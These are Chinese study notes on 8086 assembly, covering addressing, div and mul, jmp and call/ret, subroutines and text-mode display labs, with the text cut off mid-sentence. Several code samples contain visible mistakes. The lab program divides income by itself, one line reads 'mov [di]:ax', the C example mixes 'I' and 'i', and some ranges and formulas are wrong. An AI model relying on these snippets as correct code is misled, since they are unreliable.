bx、si、di、bp\n在8086CPU中，只有这4个寄存器（bx、bp、si、di）可以用在”[…]”中来进行内存单元的寻址；\n在”[…]”中，这4个寄存器（bx、bp、si、di）可以单个出现，或只能以四种组合出现：bx和si、bx和di、bp和si、bp和di；\n只要在[…]中使用寄存器bp，而指令中没有显性的给出段地址，段地址就默认在ss中；\n\n2. 机器指令处理的数据所在位置绝大部分机器指令都是进行数据处理的指令，处理大致可分为三类：读取，写入，运算。\n指令在执行前，所要处理的数据可以在三个地方：CPU内部、内存、端口。\n3. 汇编语言中数据位置的表达汇编语言中用三个概念来表达数据的位置：\n\n立即数（idata）\n寄存器\n段地址（SA）和偏移地址（EA）\n\n4. 寻址方式\n5. 指令要处理的数据有多长？8086CPU的指令，可以处理两种尺寸的数据，byte（8）和word（16）。所以在机器指令中要指明，指令进行的是字操作还是字节操作。\n\n通过寄存器名指明要处理的数据的尺寸。\n在没有寄存器名存在的情况下，用操作符X ptr指明内存单元长度，X在汇编指令中可以为word或byte。–&gt; 例：mov word ptr ds:[0],1\n其他方法。有些指令默认了访问的是字单元还是字节单元，例如push指令只进行字操作。\n\nmov byte ptr [1000H],1 访问的是地址为ds:1000H的字节单元，修改的是 ds:1000H单元的内容；而 mov word ptr [1000H],1 访问的是地址为ds:1000H的字单元，修改的是ds:1000H和ds：1001H两个单元的内容。\n6. 寻址方式的综合应用情境中要修改的数据：1、DEC公司的排名字段2、DEC公司的收入字段3、DEC公司的产品字段，这个是字符的\n汇编代码如下：\nmov ax,seg\nmov ds,ax\nmov bx,60h                ;确定记录的地址：ds：bx\nmov word ptr [bx+0ch],38  ;排名字段改成38\nadd word ptr [bx+0eh],70  ;收入字段增加70\n​\nmov si,0                  ;用si来定位产品字符串中的字符\nmov byte ptr [bx+10h+si],&#39;V&#39;\ninc si\nmov byte ptr [bx+10h+si],&#39;A&#39;\ninc si\nmov byte ptr [bx+10h+si],&#39;X&#39;\n\nc语言代码如下：\nstruct company\n&#123;\n char cn[3];  &#x2F;&#x2F;定义公司的名称\n char hn[9];  &#x2F;&#x2F;定义总裁姓名\n int pm;      &#x2F;&#x2F;排名\n int sr;      &#x2F;&#x2F;收入\n char cp[3];  &#x2F;&#x2F;著名产品\n&#125;;\n​\nstruct company dec &#x3D; &#123;&quot;DEC&quot;,&quot;Ken Olsen&quot;,137,40,&quot;PDF&quot;&#125;;\n​\nint main()\n&#123;\n int I;\n dec.pm &#x3D; 38;\n dec.sr &#x3D; dec.sr + 70;\n i &#x3D; 0;\n dec.cp[i] &#x3D; &#39;V&#39;;\n I++;\n dec.cp[i] &#x3D; &#39;A&#39;;\n I++;\n dec.cp[i] &#x3D; &#39;X&#39;;\n&#125;\n\n二者对比：\nmov ax,seg\nmov ds,ax\nmov bx,60h \nmov word ptr [bx+0ch],38  ;C: dec.pm &#x3D; 38;\nadd word ptr [bx+0eh],70  ;C: dec.sr &#x3D; dec.sr + 70;\n​\nmov si,0                  ;C: i &#x3D; 0;\nmov byte ptr [bx+10h+si],&#39;V&#39;  ;C: dec.cp[i] &#x3D; &#39;V&#39;;\ninc si                      ;C: i++;\nmov byte ptr [bx+10h+si],&#39;A&#39;  ;C: dec.cp[i] &#x3D; &#39;A&#39;;\ninc si                      ;C: i++;\nmov byte ptr [bx+10h+si],&#39;X&#39;  ;C: dec.cp[i] &#x3D; &#39;X&#39;;\n\n总结：\n\n我们可以看到，8086CPU提供的如[bx+si+idata]的寻址方式为结构化数据的处理提供了方便，使得我们可以在编程的时候从结构化的角度去看待所要处理的数据；\n一般来说，我们可以用[bx+si+idata]的方式来访问结构体中的数据；\n用bx来定位整个结构体，用idata定位结构体中的某一个数据项，用si定位数组项中的每个元素，如：[bx].idata、[bx].idata[si]；\n\n7. div指令div是除法指令，使用div作除法的时候：除数：8位或16位，在寄存器或内存单元中；被除数：（默认）放在AX或DX和AX中；\n对应：\n\n\n\n除数\n被除数\n\n\n\n8位\n16位（AX）\n\n\n16位\n32位（DX+AX）\n\n\n结果：\n\n\n\n运算\n8位\n16位\n\n\n\n商\nAL\nAX\n\n\n余数\nAH\nDX\n\n\ndiv指令示例:\ndiv byte ptr ds:[0]\n含义为： (al)&#x3D;(ax)&#x2F;((ds)*16+0)的商；\n        (ah)&#x3D;(ax)&#x2F;((ds)*16+0)的余数\n\ndiv word ptr es:[0]\n含义为： (ax)&#x3D;[(dx)*10000H+(ax)]&#x2F;((ds)*16+0)的商；\n        (dx)&#x3D;[(dx)*10000H+(ax)]&#x2F;((ds)*16+0)的余数\n\ndiv byte ptr [bx+si+8]\n含义为：(al)&#x3D;(ax)&#x2F;((ds)*16+(bx)+(si)+8)的商；\n        (ah)&#x3D;(ax)&#x2F;((ds)*16+(bx)+(si)+8)的余数\n\ndiv word ptr [bx+si+8]\n含义为： (ax)&#x3D;[(dx)*10000H+(ax)]&#x2F;((ds)*16+(bx)+(si)+0)的商；\n        (dx)&#x3D;[(dx)*10000H+(ax)]&#x2F;((ds)*16+(bx)+(si)+0)的余数\n\n8. 伪指令dd前面我们用db和dw定义字节型数据和字型数据。\ndd是用来定义dword（double word双字）型数据的。\n9. dupdup是一个操作符，在汇编语言中同db、dw、dd等一样，也是由编译器识别处理的符号。\n它是和db、dw、dd等数据定义伪指令配合使用的，用来进行数据的重复。\n\ndb 重复的次数 dup (重复的字节型数据)\ndw 重复的次数 dup (重复的字型数据)\ndd 重复的次数 dup (重复的双字型数据)\n\ndup示例：\ndb 3 dup (0)\n定义了3个字节，它们的值都是0，\n相当于db 0,0,0\n\n10. 实验：寻址方式在结构化数据访问中的应用实验情景：\nPower idea公司从1975年成立到1995年的基本情况如下：\n\n\n\n年份\n收入（千美元）\n雇员（人）\n人均收入（千美元）\n\n\n\n1975\n16\n4\n？\n\n\n1976\n22\n7\n？\n\n\n1977\n382\n10\n？\n\n\n1978\n1356\n13\n？\n\n\n1979\n2390\n28\n？\n\n\n1980\n8000\n38\n？\n\n\n…\n\n\n\n\n\n1995\n5937000\n17800\n？\n\n\n下面的代码中，已经定义好了这些数据：\nassume cs:codesg\n\ndata segment\ndb &#39;1975&#39;,&#39;1976&#39;,&#39;1977&#39;,&#39;1978&#39;,&#39;1979&#39;,1980&#39;,&#39;1981&#39;,&#39;1982&#39;,&#39;1983&#39;\ndb &#39;1984&#39;,&#39;1985&#39;,&#39;1986&#39;,&#39;1987&#39;,&#39;1988&#39;,&#39;1989&#39;,&#39;1990&#39;,&#39;1991&#39;,&#39;1992&#39;\ndb &#39;1993&#39;,&#39;1994&#39;,&#39;1995&#39;     ;以上是表示21年的21个字符串\n\ndd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140317,197514\ndd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000     \n;以上表示21年公司总收入的21个dword型数据\n\ndw 4,7,10,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226\ndw 11542,14430,15257,17800  \n;以上是表示21年公司雇员人数的21个word型数据\n\ndata ends\ntable segment\ndb 21 dup (&#39;year summ ne ??&#39;)\ntable ends\n\n编程，将data段中的数据按如下格式写入到table段中，并计算21年中的人均收入（取整），结果也按照下面的格式保存在table段中。\n\n注1：实验中需要进行21次类似操作，故需要使用Loop指令来实现循环结构，循环次数默认存放在cx寄存器中。\n例如，要计算2的20次方，其具体格式如下：\n\n                       mov ax, 2\n\n                       mov cx, 19\n\n                     s: add ax,ax\n\n                       loop  s\n\n注2：计算人均收入需要使用div指令。Div指令格式如下：\n\n                       Div 寄存器&#x2F;内存单元（除数的存放地址）\n\n被除数默认存放在AX（或DX和AX）中。\n如果除数为16位，被除数为32位，则被除数存放在DX和AX中，其中DX存放高16位，AX存放低16位。\n同时AX存放除法操作的商，DX存放除法操作的余数。\n\n例如：\ndiv word ptr ES:[0]\n\n需要注意的是，在对内存单元的访问中，使用word ptr（属性修改运算符PTR）来指明访问的内存单元是字单元。\n若使用 byte ptr，则说明访问的是字节单元。\n\n实验程序：\nassume cs:code,es:data,ds:table        \ndata segment\n    year db &#39;1975&#39;,&#39;1976&#39;,&#39;1977&#39;,&#39;1978&#39;,&#39;1979&#39;,&#39;1980&#39;,&#39;1981&#39;,&#39;1982&#39;,&#39;1983&#39;     \n    db &#39;1984&#39;,&#39;1985&#39;,&#39;1986&#39;,&#39;1987&#39;,&#39;1988&#39;,&#39;1989&#39;,&#39;1990&#39;,&#39;1991&#39;,&#39;1992&#39;\n    db &#39;1993&#39;,&#39;1994&#39;,&#39;1995&#39;   \n    ;以上是表示21年的21个字符串  \n    income dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140317,197514     \n    dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000  \n    ;以上表示21年公司总收入的21个dword型数据\n    empl dw 4,7,10,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226\n    dw 11542,14430,15257,17800\n    ;以上是表示21年公司雇员人数的21个word型数据\nends\n \ntable segment\ndb 21 dup (&#39;year summ ne ?? &#39;)  ；最后这里像实验要求的内容一样，需要留出一个空格\ntable ends\n \ncode segment\nstart:\n    mov ax,table   \n    mov ds,ax\n    mov ax,data\n    mov es,ax\n    \n    mov cx,21 ;设置循环次数\n    \n    mov si,0  ;table\n    mov di,0  ;year,income\n    mov bx,0  ;empl,average\n    ;mov bp,0  ;empl\n    \n    ;将年份移入table中\n  s:mov ax,es:year[di]\n    mov ds:[si],ax \n    mov ax,es:year[di+2]\n    mov ds:[si+2],ax\n    \n    ;将收入移入table中\n    mov ax,es:income[di]\n    mov ds:[si+5],ax\n    mov ax,es:income[di+2]\n    mov ds:[si+7],ax\n        \n    ;将雇员数移到table中\n    mov ax,es:empl[bx]\n    mov ds:[si+10],ax\n    \n    ;计算人均收入，存入table中\n    mov dx,es:income[di+2] ; 被除数为32位 dx存放高16位 \n    mov ax,es:income[di]   ; ax存放低16位\n    div word ptr es:income[di]\n    mov ds:[si+13],ax\n    \n    add si,10H\n    add di,4\n    add bx,2\n    \n    loop s          \n    \n    mov ax, 4c00h ; exit to operating system.\n    int 21h    \nends\n \nend start ; set entry point and stop the assembler.","slug":"05","date":"2023-07-25T03:20:34.000Z","categories_index":"学习笔记","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"c9873ffc4b3a92fe4a08884e06b8fafa","title":"8086汇编学习笔记_06","content":"转移指令的原理可以修改ip，或同时修改cs和ip的指令统称为转移指令。（就是可以控制CPU执行内存中某处代码的指令）\n\n段内转移：只修改ip（如：jmp ax）\n段间转移：同时修改cs和ip（如jmp 1000：0）\n\n其中，段内转移又分为：\n\n短转移：ip的修改范围是-128-127\n近转移：ip的修改范围是-32768-32767\n\n8086CPU的转移指令分为以下几类：\n\n无条件转移指令（如：jmp）\n条件转移指令\n循环指令（如：loop）\n过程\n中断\n\n1. 操作符offset操作符offset在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。\n比如下面的程序：\nassume cs:codesg\n\ncodesg segment\nstart:  mov ax,offset start;      相当于 mov ax,偏移地址0，段地址是从0开始\n\ns:      mov ax,offset s\n;相当于 mov ax,3，标记的是代码段中的第二条指令，第一条指令长度为3个字节，则s的偏移地址为3\n\ncodesg ends\n\nend start\n\n2. jmp指令jmp位无条件转移，可以只修改IP，也可以同时修改CS和IP；\n\njmp指令需要给出两种信息\n1、转移的目的地址；\n2、转移的距离(段间转移、段内转移、段内近转移)。\n\n\n\n3. 依据位移进行转移的jmp指令\njmp short 标号 （转到标号处执行指令）\n\n这种格式的jmp指令实现的是段内短转移，它对ip的修改范围是：-128-127，也就是说，它向前转移时可以最多越过128个字节，向后转移可以最多越过127个字节。\nassume cs:codesg\ncodesg segment?\nstart:  mov ax,0?\n        jmp short s?\n        add ax,1?\n    s:  inc ax\ncodesg ends\nend start\n\n在一般的汇编指令中，汇编指令中的idata（立即数），不论它是表示一个数据还是内存单元的偏移地址，都会在对应的机器指令中出现，因为CPU执行的是机器指令，它必须要处理这些数据或地址。\njmp 0008 （ Debug 中的表示）或jmp short s（汇编语言中的表示）所对应的机器码为EB 03，注意，这个机器码中竞不包含转移的目的地址。\n这意味着，CPU 在执行EB 03的时候，并不知道转移目的地址。\n也就是说，CPU不需要这个目的地址就可以实现对IP的修改。\njmp short s指令的读取和执行过程：\n\n（1）（CS）＝0BBDH，（IP）＝0006，CS：IP指向EB 03（jmp short s的机器码）；\n\n（2）读取指令码EB 03进入指令缓冲器；\n\n（3）（IP）＝（IP）＋所读取指令的长度＝（IP）＋2＝0008，CS：IP指向add ax，1；\n\n（4）CPU指行指令缓冲器中的指令EB 03；\n\n（5）指令EB 03执行后，（IP）＝000BH，CS：IP指向inc ax。 \n\n实际上，指令“jmp short 标号”的功能为（IP）＝（IP）＋8位位移。\n\n（1）8位位移＝“标号”处的地址—jmp指令后的第一个字节的地址；\n\n（2）short指明此处的位移为8位位移；\n\n（3）8位位移的范围为-128～127，用补码表示；\n\n（4）8位位移由编译程序在编译时算出。\n\n\njmp near ptr 标号\n\n“jmp near ptr 标号”的功能为：(IP)&#x3D;(IP)+16位位移\n指令“jmp near ptr 标号”的说明：\n\n（1）16位位移＝“标号”处的地址—jmp指令后的第一个字节的地址；\n\n（2）near ptr指明此处的位移为16位位移，进行的是段内近转移；\n\n（3）16位位移的范围为-32769～32767，用补码表示；\n\n（4）16位位移由编译程序在编译时算出。\n\n4. 转移的目的地址在指令中的jmp指令前面讲的jmp指令，其对应的机器码中并没有转移的目的地址，而是相对于当前IP的转移位移。\n\njmp far ptr 标号\n\n实现的是段间转移，又称为远转移。\n指令“jmp far ptr 标号”功能如下：\n(CS)&#x3D;标号所在段的段地址；\n(IP)&#x3D;标号所在段中的偏移地址；\n\nfar ptr指明了指令用标号的段地址和偏移地址修改CS和IP。\n\n源程序中的db 256 dup（0），被Debug解释为相应的若干汇编指令。这不是关键，关键是，我们要注意一下jmp far ptr s所对应的机器码：EA 0B 01 BD 0B，其中包含转移的目的地址。\n“0B 01 BD 0B”是目的地址在指令中的存储顺序，高地址的“BD 0B”是转移的段地址：0BBDH,低地址的“0B01”是偏移地址：010BH。\n5. 转移地址在寄存器中的jmp指令指令格式：jmp 16位寄存器\n功能：IP&#x3D;（16位寄存器）\n6.转移地址在内存中的jmp指令转移地址在内存中的jmp指令有两种格式：（1）jmp word ptr 内存单元地址（段内转移）功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址。\n内存单元地址可用寻址方式的任一格式给出。\n（2）jmp dword ptr 内存单元地址 （段间转移）功能：从内存单元处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址。（CS）&#x3D;（内存单元地址+2）（IP）&#x3D;（内存单元地址）\n内存单元地址可用须知方式的任一格式给出。\n7. jcxz指令jcxz指令为有条件转移指令，所有的有条件转移指令都是段转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127.\n指令格式：jcxz 标号（如果（cx）&#x3D;0，则转移到标号处执行。）\njcxz 标号 指令操作：\n\n当（cx）&#x3D; 0，（IP）&#x3D;（IP）+8位位移）\n8位位移&#x3D;“标号”处的地址-jcxz指令后的第一个字节的地址；\n8位位移的范围为-128~127，用补码表示；\n8位位移由编译程序在编译时算出。\n\n\n当（cx）≠ 0，什么也不做（程序向下执行）。\n\n8. loop指令loop指令为循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。\n对IP的修改范围都为-128~127.\n指令格式：loop 标号（（cx））&#x3D;（cx）-1，如果（cx）≠ 0，转移到标号处执行。\nloop 标号 指令操作：\n\n（1）（cx）&#x3D;（cx）-1；（2）如果（cx）≠0，（IP）&#x3D;（IP）+8位位移。\n8位位移&#x3D;“标号”处的地址-loop指令后的第一个字节的地址；\n8位位移的范围为-128~127，用补码表示；\n8位位移由编译程序在编译时算出。\n\n\n当（cx）&#x3D; 0，什么也不做（程序向下执行）\n\n9. 根据位移进行转移的意义之前学过的：jmp short 标号jmp near ptr 标号jcxz 标号loop 标号等几种汇编指令，它们对IP的修改是根据转移目的地址和转移起始地址之间的位移来进行的。在它们对应的机器码中不包含转移的目的地址，而包含的是到目的地址的位移距离。\n这样的设计，方便了程序段在内存中的浮动装配。\n如果loop s的机器码中包含的是s的地址，则就对程序段在内存中的偏移地址有了严格的限制；因为机器码中包含的是s的地址，如果s处的指令不在目的地址处，程序的执行就会出错。\n而loop s的机器码中包含的是转移的位移，就不存在这个问题了；因为无论s处的指令的实际地址是多少，loop指令的转移位移是不变的。\n\n\n\n\n\n\n\n\n\n注意，根据位移进行转移的指令，它们的转移范围受到转移位移的限制，如果在源程序中出现了转移范围超界的问题，在编译的时候，编译器将报错。\n10. 实验：根据材料编程1.预备知识\n80×25 彩色字符模式显示缓冲区的结构为：\n\n内存地址空间中，B8000H~BFFFFH 共 32 KB 的空间为 80×25 彩色字符模式的显示缓存区。向这个地址空间写入数据，写入的内容将立即出现在显示器上。\n在 80×25 彩色字符模式下，显示器可以显示 25 行，每行 80 个字符，每个字符可以有 256 种属性（背景色、前景色、闪烁、高亮等组合信息）。\n这样，一个字符在该显示缓冲区内占两个字节，一个字节表示字符的 ASCII 码、另一个表示字符的属性。\n80×25 模式下，显示缓冲区一共 8 页，一屏的内容在显示缓冲区总共占 4000 个字节，即表示一页，第 0 页的地址为 B8000H~B8F9FH。\n在显示器中每行 80 字符共占 160 字节，一个字符占两个字节的存储空间，低位字节存储字符的 ASCII 码、高位字节存储字节的属性值。如在显示器的 0 行 0 列显示黑底绿色的字符串 ABCDEF，字符 A 的 ASCII 码值为 41，02 表示黑底绿色字体：B800:0000   41 02 42 02 43 02 44 02 45 02 46 02 …\n\n在屏幕上显示的字符，具有前景和背景两种颜色，字符还可以有高亮度和闪烁的显示方式，这些都是表示字符的属性。各属性的表示方法如下：\n\n\n\n[7]\n[6 5 4]\n[3]\n[2  1  0]\n\n\n\nBL\nR  G  B\nI\nR  G  B\n\n\n闪烁\n背景\n高亮\n前景\n\n\nR：红色G：绿色B：蓝色\n红底绿字：0100 0010B红底闪烁绿字：1100 0010B红底高亮绿字：0100 1010B黑底白字：0000 0111B白底蓝字：0111 0001B\n注意，闪烁的效果必须在全屏DOS方式下才能看到。\n2.实验任务编程：在屏幕中间分别显示绿色、绿底红色、白底蓝色的字符串 ‘welcome to masm!’。\n\n绿色字体对应的属性编码为 0000 0010，绿底红色对应的属性编码为 0010 0100，白底蓝色对应的属性编码为：0111 0001，十六进制分别为 02H，24H，71H。\n题目要求在屏幕中间显示字符串，80×25 彩色模式下，显示器可以显示 25 行数据，每行 80 个字符。一屏幕为 4000 字节。一共写入字节数为 1623&#x3D;96，所以字节写入范围为 1952~2047，即字符起始偏移地址为 1952（偏移地址本应为 1953，但规定偶数地址存放字符、奇数地址存放字符属性）。\n由于每个字符串需要用 16*2&#x3D;32 个字节表示，所以两两字符串间的偏移为 32。\n\n3.实验代码\nassume cs:codesg\n\ndata segment\n    db &#39;welcome to masm!&#39;    ;操作字符串\ndata ends\n\ncodesg segment\nstart:  mov ax,data \n        mov ds,ax           ;段寄存器DS指向数据段\n        mov ax,0B800h   \n        mov es,ax           ;段寄存器ES指向彩色模式区域\n        mov bx,0            ;控制字符的读取\n        mov si,1952         ;控制字符的写入，起始偏移地址为1946\n        mov cx,16           ;循环次数\n    s:  mov al,ds:[bx]      ;将当前处理字符放到寄存器AL中\n        mov es:[si],al      ;当前字符的第一个位置\n        mov ah,02h          ;第一种属性，绿色字体\n        mov es:[si+1],ah    ;当前字符的第一个属性\n        mov es:[si+32],al   ;当前字符的第二个位置，相对于第一个字符串偏移32\n        mov ah,24h          ;第二种属性，绿底红色\n        mov es:[si+32+1],ah ;当前字符的第二种属性\n        mov es:[si+64],al   ;当前字符的第三个位置，相对于第一个字符串偏移64\n        mov ah,71h          ;第三种属性，白底蓝色\n        mov es:[si+64+1],ah ;当前字符的第三种属性\n        add bx,1            ;每次偏移1个字节处理1个字符\n        add si,2            ;每次偏移2个字节写入1个字符\n        loop s \n\n        mov ax,4c00h\n        int 21h\ncodesg ends \nend start\n\ncall和ret指令call和ret指令都是转移指令，它们都修改IP，或同时修改CS和IP。\n它们经常被共同用来实现子程序的设计。\n1. ret和retf\nret指令用栈中的数据，修改IP的内容，从而实现近转移；\nretf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。\n\nCPU执行ret指令时，进行下面两步操作：（1）（IP）&#x3D;（（ss）* 16 +（sp））（2）（sp）&#x3D;（sp）+ 2\nCPU执行retf指令时，进行下面四步操作：（1）（IP）&#x3D;（（ss）* 16 +（sp））（2）（sp）&#x3D;（sp）+ 2（3）（CS）&#x3D;（（ss）* 16 +（sp））（4）（sp）&#x3D;（sp）+ 2\n可以看出，如果我们用汇编语法来解释ret和retf指令，则：\n\nCPU执行ret指令时，相当于进行：pop IP\nCPU执行retf指令时，相当于进行：pop IPpop CS\n\n2. call指令call指令经常跟ret指令配合使用，因此CPU执行call指令时，进行两步操作：（1）将当前的IP或CS和IP压入栈中（2）转移（jmp）\ncall指令不能实现短转移，除此之外，call实现转移的方法和jmp指令的原理相同。\n3. 依据位移进行转移的call指令call 标号 （将当前的IP压栈后，转到标号处执行指令）\nCPU执行此种格式的call指令时，进行如下的操作：\n\n（sp）&#x3D;（sp）- 2（（ss）*16+（sp））&#x3D;（IP）\n\n（IP）&#x3D;（IP）+16位位移\n\n\ncall 标号\n\n16位位移&#x3D;“标号”处的地址 - call指令后的第一个字节的地址；\n16位位移的范围为-32768~32767，用补码表示；\n16位位移由编译程序在编译时算出。\n\nCPU执行“call 标号”时，相当于进行：\n\npush IP\njmp near ptr 标号\n\n4. 转移的目的地址在指令中的call指令前面的call指令，其对应的机器指令中并没有转移的目的地址，而是相对于当前IP的转移位移。\n指令“call far ptr 标号”实现的是段间转移。\nCPU执行“call far ptr 标号”这种格式的call指令是的操作：\n\n（sp）&#x3D;（sp）- 2（（ss）* 16 +（sp））&#x3D;（CS）（sp）&#x3D;（sp）-2（（ss）*16 +（sp））&#x3D;（IP）\n\n（CS）&#x3D;标号所在的段地址（IP）&#x3D;标号所在的偏移地址\n\n\nCPU执行指令“call far ptr 标号”时，相当于进行：push CSpush IPjmp far ptr 标号\n5. 转移地址在寄存器中的call指令指令格式：call 16位寄存器\n功能：（sp）&#x3D;（sp）- 2（（ss）* 16 +（sp））&#x3D;（IP）（IP）&#x3D;（16位寄存器）\n汇编语法解释此种格式的call指令，CPU执行“call 16位reg”时，相当于进行：push IPjmp 16位寄存器\n6. 转移地址在内存中的call指令转移地址在内存中的call指令有两种格式：（1）call word ptr 内存单元（2）call dword ptr 内存单元\n\ncall word ptr 内存单元地址\n\n汇编语法解释：push IPjmp word ptr 内存单元地址\n\n\ncall dword ptr 内存单元地址\n\n汇编语法解释：push CSpush IPjmp dword ptr 内存单元地址\n\n\n\n7. call和ret的配合使用\n\n写一个具有一定功能的程序段，我们称其为子程序，在需要的时候，用call指令转去执行。\n\n可是执行完子程序后，如何让CPU接着call指令向下执行？答：ret指令。call指令后面的指令的地址将存储在栈中，所以可以在子程序的后面使用ret指令，用栈中的数据设置IP的值，从而转到call指令后面得到代码处继续执行。\n\n这样，我们可以利用call和ret来实现子程序的机制。\n\n\n具有子程序的源程序框架如下：\nassume cs:code\ncode segment\n    main: \n            ..\n            ..\n            call sub1    ;调用子程序sub1\n            ..\n            mov ax,4c00h\n            int 21h\n\n    sub1:\n            ..           ;子程序sub1开始\n            call sub2    ;调用子程序sub2\n            ..\n            ret          ;sub1子程序返回\n    sub2:\n            ..           ;子程序sub2开始\n            ..\n            ret          ;sub2子程序返回\ncode ends\nend main\n\n8. mul指令mul是乘法指令，使用mul做乘法的时候：（1）相乘的两个数：要么都是8位，要么都是16位；\n8位：AL中和8位寄存器或内存字节单元中；16位：AX中和16位寄存器或内存字单元中；\n（2）结果8位：AX中；16位：DX（高位）和AX（低位）中。\n格式如下：mul regmul 内存单元\n内存单元可以用不同的寻址方式给出，比如：\n\nmul byte ptr ds:[0]\n\n含义为：（ax）＝（al）＊（（ds）＊16＋0）；\n\n\nmul word ptr [bx+si+8]\n\n含义为：（ax）＝（ax）＊（（ds）＊16＋（bx）＋（si）＋8）结果的低16位；（dx）＝（ax）＊（（ds）＊16＋（bx）＋（si）＋8）结果的高16位；\n\n\n\n9. 模块化程序设计从上面我们看到，call与ret指令共同支持了汇编语言编程中的模块化设计。在实际编程中，程序的模块化是必不可少的。\ncall和ret指令对这种分析提供了程序实现上的支持。利用call和ret指令，我们可以用简洁的方法，实现多个相互联系、功能独立的子程序来解决一个复杂的问题。\n10. 参数和结果传递的问题子程序一般都要根据提供的参数处理一定的事物，处理后将结果（返回值）提供给调用者。\n其实我们讨论参数和返回值传递的问题，实际上就是在探讨，应该如何存储子程序需要的参数和产生的返回值。\n很显然，我们可以用寄存器来存储，可以将参数放到bx中；\n因为子程序中要计算N * N * N，可以使用多个mul指令，为了方便，可将结果放到dx和ax中。\n子程序：\n说明：计算N的3次方\n参数：（bx）&#x3D; N\n结果：（dx:ax）&#x3D; N^3\ncube:   mov ax,bx\n        mul bx\n        mul bx\n        ret\n\n注意，我们在编程的时候要注意良好的风格，对于程序应有详细的注释。子程序的注释信息应该包含对子程序的功能、参数和结果的说明。\n因为今天写的子程序，以后可能还会用到；自己写的子程序，也很可能要给别人使用，所以一定要有全面的说明。\n用寄存器来存储参数和结果是最常使用的方法。对于存放参数的寄存器和存放结果的寄存器，调用着和子程序的读写操作恰恰相反：\n\n调用者将参数送入参数寄存器，从结果寄存器中取到返回值；\n子程序从参数寄存器中取到参数，将返回值送入结果寄存器。\n\n编程：计算data段中第一组数据的3次方，结果保存在后面一组dword单元中。\n\nassume cs:codesg\n\ndata segment\n    dw 1,2,3,4,5,6,7,8\n    dd 0,0,0,0,0,0,0,0\ndata ends\n\ncode segment\n\nstart:  mov ax,data\n        mov ds,ax\n        mov si,0\n        mov di,16\n\n        mov cx,8\n    s:  mov bx,[si]\n        call cube\n        mov [di]:ax\n        mov [di].2,dx\n        add si,2    ;ds:si指向下一个word单元\n        add di,4    ;ds:di指向下一个dword单元\n        loop s\n\n        mov ax,4c00h\n        int 21h\n\ncube:   mov ax,bx\n        mul bx\n        mul bx\n        ret\n\ncode ends\nend start\n\n11. 批量数据的传递寄存器的数量终究有限，我们不可能简单地用寄存器来存放多个需要传递地数据。对于返回值，也有同样地问题。\n在这种时候，我们将批量数据放到内存中，然后将他们所在内存空间地首地址放在寄存器中，传递给需要的子程序。\n对于具有批量数据地返回结果，也可以用同样地方法。\n注意：除了寄存器、内存传递参数外，还有一种通用的方法，使用栈来传递参数。\n12. 寄存器冲突的问题设计一个子程序：功能：将一个全是字母，以0结尾的字符串，转化为大写。\n程序要处理的字符串以0作为结尾符，字符串可以如下定义：db ‘conversation’,0\n分析：应用这个子程序，字符串的内容后面定要有一个0，标记字符串的结束。字符串可以一次读取每个字符串进行检测，如果不是0，就进行大写的转化。如果是0，就结束处理。\n由于可通过检测0而知道是否已经处理完整个字符串，所以子程序可以不需要字符串的长度作为参数。我们可以直接用jcxz来检测0。\n子程序实现代码：capital:    mov cl,[si]            mov ch,0            jcxz ok            and byte ptr [si],11011111b            inc si            jmp short capital    ok: ret\n13. 实验：编写子程序\n1.显示字符串\n\n问题显示字符串是现实工作中经常要用到的功能，应该编写一个通用的子程序来实现这个功能。我们应该提供灵活的调用接口，使调用者可以决定显示的位置（行、列）、内容和颜色。\n提示（1）  子程序的入口参数是屏幕上的行号和列号，注意在子程序内部要将它们转化为显存中的地址，首先要分析一下屏幕上的行列位置和显存地址的对应关系：（2）  注意保存子程序中用到的相关寄存器：（3）  这个子程序的内部处理和显存的结构密切相关，但是向外提供了与显存结构无关的接口。通过调用这个子程序，进行字符串的显示时可以不必了解显存的结构，为编程提供了方便。在实验中，注意体会这种设计思想。\n子程序描述名称：show_str功能：在指定的位置，用指定的颜色，显示一个用0结束的字符串。参数：(dh)&#x3D;行号（取值范围0~24）,(dl)&#x3D;列号(取值范围0 ~ 79),    (cl)&#x3D;颜色，ds:si指向字符串的首地址返回：无就用举例：在屏幕的8行3列，用绿色显示data段中的字符串。\n代码\nassume cs:code\n   data segment\n   db &#39;Welcome to masm!&#39;,0\n   data ends\n\n code segment\n   start:  mov dh,8\n           mov dl,3\n           mov cl,2\n           mov ax,data\n           mov ds,ax\n           mov si,0\n           call show_str\n           mov ax,4c00h\n           int 21h\n   show_str: push dx\n             push cx\n             push ds\n             push si\n\n     mov ax,0b800h\n     mov es,ax\n     \n     mov al,160\n     mul dh\n     mov bx,ax\n     mov al,2\n     mul dl\n     add bx,ax\n    mov al,cl\n    \n         s: mov cl,[si] \n              jcxz ok\n              mov dx,[si]\n              mov es:[bx],dx\n              mov es:[bx+1],al\n              inc si\n              add bx,2\n              loop s\n\n ok:             \n  pop si\n  pop ds\n  pop cx\n  pop dx\nret\ncode ends\nend start \n\n\n2.解决除法溢出问题\n\n问题前面讲过，div指令可以做除法。当进行8位除法的时候，用al存储结果的商，ah存储结果的余数：进行16位除法的时候，用ax存储结果的商，dx存储结果的余数。可是，现在有一个问题，如果结果的商大于ah或ax所能存储的最大值，那么将如何？比如，下面的程序段： mov bh,1 mov ax,1000 div bh进行的是8位除法，结果的商为1000，而1000在ah中放不下，又比如，下面的程序段：mov ax,1000hmov dx,1mov bx,1div 